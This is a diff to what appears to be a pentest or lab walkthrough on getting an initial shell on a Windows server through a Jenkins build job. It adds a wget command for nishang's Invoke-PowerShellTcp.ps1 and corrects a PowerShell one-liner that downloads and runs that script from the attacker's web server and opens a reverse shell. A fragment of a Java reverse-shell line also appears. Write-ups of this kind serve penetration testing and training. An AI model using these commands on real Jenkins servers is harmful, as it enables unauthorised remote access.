@@ -38,7 +38,7 @@ Let's try to execute some code to get initial shell to Windows web server via Je
 
 First of all, use nishang script to gain reverse shell on Windows. Download this script on local machine:
 ```
-https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
 ```
 
 Sceondly, run Python webserver in the same directory that you've been downloading script mentioned above.
@@ -84,7 +84,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 2. Add Powershell code:
 
 ```
-powershell iex (New-Object Net.WebClient).DownloadString(‘http://<your_machine_IP>:<your_webserver_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <your_machine_IP>-Port <your_listener_port>
+powershell iex (New-Object Net.WebClient).DownloadString(‘http://<your_machine_IP>:<your_webserver_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <your_machine_IP> -Port <your_listener_port>
 ```
 3. Save new job configuration with `Apply`.
 4. Run job clicking `Build now` and you should have session open in your listener after job is completed.
